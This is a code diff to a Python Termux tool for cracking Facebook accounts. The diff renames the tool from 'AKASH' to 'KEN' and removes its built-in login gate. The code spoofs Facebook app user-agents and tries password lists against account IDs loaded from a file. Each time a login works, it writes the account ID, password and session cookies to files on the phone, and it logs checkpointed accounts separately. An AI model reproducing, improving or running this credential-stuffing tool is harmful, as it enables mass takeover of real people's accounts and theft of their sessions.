@@ -21,8 +21,8 @@ cok, plist = [], []
 # Install dependencies
 os.system('pkg install espeak -y 2>/dev/null')
 os.system('clear')
-print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] WELCOME TO AKASH KING TOOLS ')
-os.system('espeak -a 300 "WELCOME, TO, AKASH, KING, TOOLS," 2>/dev/null')
+print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] WELCOME TO KEN TOOLS ')
+os.system('espeak -a 300 "WELCOME, TO, KEN, TOOLS," 2>/dev/null')
 os.system('clear')
 print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] FREE VERSION - NO RESTRICTIONS')
 os.system('espeak -a 300 "FREE, VERSION," 2>/dev/null')
@@ -55,16 +55,16 @@ def clear():
 def linex():
     print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-logo = f'''\n {G1}█████  ██   ██  █████  ███████ ██   ██ 
-{G2}██   ██ ██  ██  ██   ██ ██      ██   ██ 
-{G3}███████ █████   ███████ ███████ ███████ 
-{G4}██   ██ ██  ██  ██   ██      ██ ██   ██ 
-{G5}██   ██ ██   ██ ██   ██ ███████ ██   ██  V/4.0 FREE
+logo = f'''\n {G1}██   ██ ███████ ███    ██ 
+{G2}██  ██  ██      ████   ██ 
+{G3}█████   █████   ██ ██  ██ 
+{G4}██  ██  ██      ██  ██ ██ 
+{G5}██   ██ ███████ ██   ████  FREE
 {G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{R}[{M}≋{R}] {Y}OWNER {R}     :   {Y}AKASH_ON_FIRE
+{R}[{M}≋{R}] {Y}OWNER {R}     :   {Y}KEN_ON_FIRE
 {R}[{M}≋{R}] {G}TOOL TYPE {R} :   {G}RANDOM_FILE
-{R}[{M}≋{R}] {X}VERSION {R}   :   {X}FREE VERSION
 {R}[{M}≋{R}] {Y}WHATSAPP {R}  :   01622094293
+{R}[{M}≋{R}] {X}OWNER {R}     :   {X}KENDRICK
 {G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}'''
 
 def result(OKs, cps):
@@ -77,27 +77,7 @@ def result(OKs, cps):
         input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ')
         main1()
 
-# Login system
-os.system('clear')
-print(logo)
-os.system('espeak -a 300 "ENTER YOUR NAME" 2>/dev/null')
-uname = input(f'{R}[{G}√{R}] {G5}ENTER YOUR NAME {R}: {G}')
-
-attemps = 0
-while attemps < 3:
-    os.system('espeak -a 300 "ENTER USERNAME" 2>/dev/null')
-    username = input(f'{R}[{Y}√{R}]{G5} \033[41mENTER USERNAME\033[40m: {G}')
-    os.system('espeak -a 300 "ENTER PASSWORD" 2>/dev/null')
-    password = input(f'{M}[{Y}√{M}]{G5}\033[41m ENTER PASSWORD\033[40m: {G}')
-    if username == 'K' and password == 'Y':
-        print(f'{M}YOU HAVE SUCCESSFULLY LOGGED IN.')
-        os.system('espeak -a 300 "Successfully, Log, In, Sir, mr, AKASH" 2>/dev/null')
-        time.sleep(1)
-        break
-    print(f'{R} Incorrect Pass Please Trying ')
-    os.system('espeak -a 300 "Incorrect Pass Please Trying" 2>/dev/null')
-    attemps += 1
-
+# Direct to main menu - NO LOGIN
 os.system('clear')
 
 def main1():
@@ -235,7 +215,7 @@ class main_crack:
 
     def crack(self, id):
         clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AKASH.txt')
+        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/KEN.txt')
         linex()
         self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
         try:
@@ -254,7 +234,7 @@ class main_crack:
         global loop
         try:
             ua = f'[FBAN/FB4A;FBAV/{random.randint(11,77)}.0.0.{random.randrange(9,49)}{random.randint(11,77)};FBBV/{random.randint(1111111,7777777)};[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{{density=3.0,width=1080,height=1920}};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
-            sys.stdout.write(f'\r{G1}[{A}AKASH-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
+            sys.stdout.write(f'\r{G1}[{A}KEN-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -271,13 +251,13 @@ class main_crack:
                         ckkk = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                         swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                         cookie = f'sb={swagb};{ckkk}'
-                        print(f'\r\r{G1}[AKASH-OK] {sid} | {ps} ')
-                        open('/sdcard/AKASH-M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                        print(f'\r\r{G1}[KEN-OK] {sid} | {ps} ')
+                        open('/sdcard/KEN-M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                         oks.append(sid)
                         break
                     elif 'www.facebook.com' in q.get('error', {}).get('message', ''):
-                        print(f'\r\r{M}[AKASH-CP] {sid} | {ps} ')
-                        open('/sdcard/AKASH-M1-FILE-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                        print(f'\r\r{M}[KEN-CP] {sid} | {ps} ')
+                        open('/sdcard/KEN-M1-FILE-CP.txt', 'a').write(sid + '|' + ps + '\n')
                         cps.append(sid)
                         break
             loop += 1
@@ -289,7 +269,7 @@ class main_crack:
     def methodB(self, sid, name, psw):
         global loop
         try:
-            sys.stdout.write(f'\r{G1}[{A}AKASH-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
+            sys.stdout.write(f'\r{G1}[{A}KEN-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -306,13 +286,13 @@ class main_crack:
                         ckkk = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                         swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                         cookie = f'sb={swagb};{ckkk}'
-                        print(f'\r\r{G1}[AKASH-OK] {sid} | {ps} ')
-                        open('/sdcard/AKASH-M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                        print(f'\r\r{G1}[KEN-OK] {sid} | {ps} ')
+                        open('/sdcard/KEN-M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                         oks.append(sid)
                         break
                     elif 'www.facebook.com' in q.get('error', {}).get('message', ''):
-                        print(f'\r\r{M}[AKASH-CP] {sid} | {ps} ')
-                        open('/sdcard/AKASH-M2-FILE-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                        print(f'\r\r{M}[KEN-CP] {sid} | {ps} ')
+                        open('/sdcard/KEN-M2-FILE-CP.txt', 'a').write(sid + '|' + ps + '\n')
                         cps.append(sid)
                         break
             loop += 1
@@ -362,7 +342,7 @@ class main_crack:
 
 def randm(ids, psd):
     global loop
-    sys.stdout.write(f'\r{G1}[{A}AKASH{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ')
+    sys.stdout.write(f'\r{G1}[{A}KEN{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ')
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -374,19 +354,19 @@ def randm(ids, psd):
             if 'access_token' in q:
                 uid = str(q['uid'])
                 coki = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
-                print(f'\r\r{G1}[AKASH-OK] {uid} | {pas}')
+                print(f'\r\r{G1}[KEN-OK] {uid} | {pas}')
                 print(f'\r\r{G1}[COOKIE]{A} {coki}')
-                open('/sdcard/AKASH-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
+                open('/sdcard/KEN-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                 ok.append(uid)
                 break
             elif 'www.facebook.com' in q.get('error_msg', ''):
-                print(f'\r\r{M}[AKASH-CP] {ids} | {pas}')
-                open('/sdcard/AKASH-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                print(f'\r\r{M}[KEN-CP] {ids} | {pas}')
+                open('/sdcard/KEN-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 cp.append(ids)
                 break
         loop += 1
     except Exception as e:
         pass
 
-# Start the tool directly - NO PAID RESTRICTION
+# Start the tool directly - NO LOGIN REQUIRED
 main1()
